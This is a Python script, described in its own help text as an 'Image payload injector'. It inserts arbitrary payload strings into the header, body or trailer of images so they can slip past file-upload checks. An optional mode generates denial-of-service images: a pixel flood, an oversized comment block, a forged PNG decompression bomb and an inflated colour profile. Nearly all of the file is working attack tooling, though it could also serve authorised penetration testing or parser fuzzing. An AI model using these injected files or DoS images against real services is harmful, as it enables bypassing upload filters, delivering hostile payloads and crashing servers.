#!/usr/bin/env python3
import argparse
import os
import shutil
import concurrent.futures
from PIL import Image, PngImagePlugin
import io
import struct
import time
import traceback
from tqdm import tqdm

def inject_header(image_path, payload, output_path):
    with open(image_path, 'rb') as f:
        image_data = f.read()

    if image_path.lower().endswith('.png'):
        new_data = image_data[:8] + payload.encode() + image_data[8:]
    elif image_path.lower().endswith(('.jpg', '.jpeg')):
        new_data = image_data[:2] + payload.encode() + image_data[2:]
    elif image_path.lower().endswith('.gif'):
        new_data = image_data[:6] + payload.encode() + image_data[6:]
    else:
        new_data = payload.encode() + image_data

    with open(output_path, 'wb') as f:
        f.write(new_data)

def inject_body(image_path, payload, output_path):
    with open(image_path, 'rb') as f:
        image_data = f.read()

    mid_point = len(image_data) // 2

    if image_path.lower().endswith('.png'):
        idat_pos = image_data.find(b'IDAT', 8)
        insertion_point = idat_pos - 4 if idat_pos > 0 else mid_point
    elif image_path.lower().endswith(('.jpg', '.jpeg')):
        marker_pos = image_data.find(b'\xFF', mid_point - 1000, mid_point + 1000)
        insertion_point = marker_pos + 2 if marker_pos > 0 else mid_point
    else:
        insertion_point = mid_point

    new_data = image_data[:insertion_point] + payload.encode() + image_data[insertion_point:]

    with open(output_path, 'wb') as f:
        f.write(new_data)

def inject_trailer(image_path, payload, output_path):
    with open(image_path, 'rb') as f:
        image_data = f.read()

    new_data = image_data + payload.encode()

    with open(output_path, 'wb') as f:
        f.write(new_data)

def create_pixel_flood_image(output_path):
    try:
        # Use more reasonable dimensions to avoid memory issues
        width, height = 10000, 10000
        img = Image.new('RGB', (width, height), color='white')
        img.save(output_path)
        return True
    except Exception as e:
        print(f"Error creating pixel flood image: {str(e)}")
        try:
            # Try with even smaller dimensions
            width, height = 5000, 5000
            img = Image.new('RGB', (width, height), color='white')
            img.save(output_path)
            return True
        except Exception as e:
            print(f"Error creating smaller pixel flood image: {str(e)}")
            return False

def create_long_body_image(output_path):
    try:
        img = Image.new('RGB', (100, 100), color='white')

        if output_path.lower().endswith('.png'):
            meta = PngImagePlugin.PngInfo()
            # Reduce metadata size to avoid memory issues
            for i in range(100):
                meta.add_text(f"Comment{i}", "A" * 100)
            img.save(output_path, pnginfo=meta)
        else:
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG")
            img_data = buffer.getvalue()

            with open(output_path, 'wb') as f:
                f.write(img_data[:20])
                f.write(b'\xFF\xFE')
                comment_length = 10000  # Reduced from 65000
                f.write(struct.pack('>H', comment_length + 2))
                f.write(b'A' * comment_length)
                f.write(img_data[20:])
        return True
    except Exception as e:
        print(f"Error creating long body image: {str(e)}")
        traceback.print_exc()
        return False

def create_decompression_bomb(output_path):
    try:
        width, height = 1, 1
        img = Image.new('RGB', (width, height), color='white')

        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        img_data = buffer.getvalue()

        with open(output_path, 'wb') as f:
            f.write(img_data[:8])
            f.write(struct.pack('>I', 13))
            f.write(b'IHDR')
            # Use smaller dimensions
            f.write(struct.pack('>II', 10000, 10000))
            f.write(struct.pack('B', 8))
            f.write(struct.pack('B', 2))
            f.write(struct.pack('B', 0))
            f.write(struct.pack('B', 0))
            f.write(struct.pack('B', 0))
            f.write(struct.pack('>I', 0x575bc4be))

            f.write(struct.pack('>I', 24))
            f.write(b'IDAT')
            f.write(b'\x78\x9c\xed\xc1\x01\x0d\x00\x00\x00\xc2\xa0\xf7\x4f\x6d')
            f.write(b'\x0f\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            f.write(struct.pack('>I', 0x1c9eb455))

            f.write(struct.pack('>I', 0))
            f.write(b'IEND')
            f.write(struct.pack('>I', 0xae426082))
        return True
    except Exception as e:
        print(f"Error creating decompression bomb: {str(e)}")
        traceback.print_exc()
        return False

def create_color_profile_dos(output_path):
    try:
        img = Image.new('RGB', (100, 100), color='white')

        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        img_data = buffer.getvalue()

        with open(output_path, 'wb') as f:
            f.write(img_data[:33])
            # Use a smaller profile size
            profile_size = 1024*100  # Reduced from 1024*1024
            f.write(struct.pack('>I', profile_size))
            f.write(b'iCCP')
            f.write(b'Profile\0')
            f.write(struct.pack('B', 0))
            f.write(b'\0' * (profile_size - 9))
            f.write(struct.pack('>I', 0x12345678))

            idat_pos = img_data.find(b'IDAT')
            if idat_pos > 0:
                f.write(img_data[idat_pos-4:])
        return True
    except Exception as e:
        print(f"Error creating color profile DoS: {str(e)}")
        traceback.print_exc()
        return False

def process_payload(image_path, payload, payload_num, loaded_dir):
    try:
        output_path = os.path.join(loaded_dir, f"img_p_{payload_num}_m1.png")
        inject_header(image_path, payload, output_path)

        output_path = os.path.join(loaded_dir, f"img_p_{payload_num}_m2.png")
        inject_body(image_path, payload, output_path)

        output_path = os.path.join(loaded_dir, f"img_p_{payload_num}_m3.png")
        inject_trailer(image_path, payload, output_path)
        return True
    except Exception as e:
        print(f"Error processing payload {payload_num}: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Image payload injector')
    parser.add_argument('-i', required=True, help='Path to the image file')
    parser.add_argument('-p', help='Path to the payload text file')
    parser.add_argument('--dosimage', action='store_true', help='Create DoS images instead of using payloads')
    parser.add_argument('--threads', type=int, default=4, help='Number of concurrent threads')
    args = parser.parse_args()

    start_time = time.time()

    if not os.path.exists(args.i):
        print(f"Error: Image file not found: {args.i}")
        return

    loaded_dir = 'loaded'
    if os.path.exists(loaded_dir):
        shutil.rmtree(loaded_dir)
    os.makedirs(loaded_dir)

    if args.dosimage:
        print("Creating DoS images...")
        dos_types = 4
        successful_dos = 0

        # Create the DoS images sequentially with proper progress tracking
        with tqdm(total=dos_types, desc="Creating DoS images") as pbar:
            pixel_flood_path = os.path.join(loaded_dir, "dos_pixel_flood.png")
            if create_pixel_flood_image(pixel_flood_path):
                successful_dos += 1
            pbar.update(1)

            long_body_path = os.path.join(loaded_dir, "dos_long_body.png")
            if create_long_body_image(long_body_path):
                successful_dos += 1
            pbar.update(1)

            decompression_path = os.path.join(loaded_dir, "dos_decompression.png")
            if create_decompression_bomb(decompression_path):
                successful_dos += 1
            pbar.update(1)

            color_profile_path = os.path.join(loaded_dir, "dos_color_profile.png")
            if create_color_profile_dos(color_profile_path):
                successful_dos += 1
            pbar.update(1)

        total_time = time.time() - start_time

        print("\n" + "="*50)
        print("Execution Summary:")
        print("-"*50)
        print(f"Total DoS image types     : {dos_types}")
        print(f"Successful DoS images     : {successful_dos}")
        print(f"Failed DoS images         : {dos_types - successful_dos}")
        print(f"Processing time           : {total_time:.2f} seconds")
        print("="*50)
        print(f"DoS images created in '{loaded_dir}' directory.")

    else:
        if not args.p:
            parser.error("Payload file (-p) is required when not using --dosimage")

        if not os.path.exists(args.p):
            print(f"Error: Payload file not found: {args.p}")
            return

        with open(args.p, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]

        if not payloads:
            print("Error: No payloads found in the payload file.")
            return

        total_payloads = len(payloads)
        mutations_per_payload = 3  # header, body, trailer
        total_images = total_payloads * mutations_per_payload
        successful_payloads = 0

        print(f"Processing {total_payloads} payloads...")

        with tqdm(total=total_payloads, desc="Processing payloads") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = []
                for i, payload in enumerate(payloads, 1):
                    future = executor.submit(process_payload, args.i, payload, i, loaded_dir)
                    futures.append(future)

                for future in concurrent.futures.as_completed(futures):
                    if future.result():
                        successful_payloads += 1
                    pbar.update(1)

        total_time = time.time() - start_time

        print("\n" + "="*50)
        print("Execution Summary:")
        print("-"*50)
        print(f"Total payloads processed  : {total_payloads}")
        print(f"Successful payloads       : {successful_payloads}")
        print(f"Failed payloads           : {total_payloads - successful_payloads}")
        print(f"Mutations per payload     : {mutations_per_payload}")
        print(f"Total images generated    : {successful_payloads * mutations_per_payload}")
        print(f"Processing time           : {total_time:.2f} seconds")
        print(f"Average time per payload  : {total_time/total_payloads:.2f} seconds")
        print("="*50)
        print(f"All payloads processed. Output files are in the '{loaded_dir}' directory.")

if __name__ == "__main__":
    main()
